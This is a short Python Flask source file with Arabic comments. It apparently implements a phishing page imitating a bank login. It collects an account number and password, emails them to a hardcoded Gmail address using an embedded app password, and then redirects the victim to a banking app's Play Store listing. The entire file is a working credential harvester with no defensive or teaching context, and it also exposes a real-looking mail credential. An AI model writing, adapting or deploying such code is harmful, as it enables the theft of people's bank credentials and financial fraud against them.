from flask import Flask, render_template, request, redirect
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # استلام بيانات المستخدم من النموذج
        account_number = request.form.get('account_number')
        password = request.form.get('password')

        try:
            # إرسال المعلومات إلى البريد الإلكتروني
            send_email(account_number, password)
        except Exception as e:
            print(f"حدث خطأ أثناء إرسال البريد الإلكتروني: {e}")

        # إعادة توجيه المستخدم إلى رابط معين
        return redirect("https://play.google.com/store/apps/details?id=com.mode.bok.ui")

    return render_template('index.html')  # تأكد من أن لديك ملف 'index.html' في مجلد القوالب

def send_email(account_number, password):
    sender_email = "abdallihabdalazem12@gmail.com"
    receiver_email = "abdallihabdalazem12@gmail.com"
    subject = "معلومات تسجيل الدخول"
    body = f"رقم الحساب: {account_number}\nكلمة المرور: {password}"

    # إعداد رسالة البريد الإلكتروني
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # إعداد خادم SMTP
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        # تسجيل الدخول باستخدام كلمة مرور التطبيق
        server.login(sender_email, "owxhvwkyavcvrjnl")
        server.sendmail(sender_email, receiver_email, msg.as_string())

if __name__ == '__main__':
    # تشغيل التطبيق في وضع التصحيح
    app.run(debug=True)
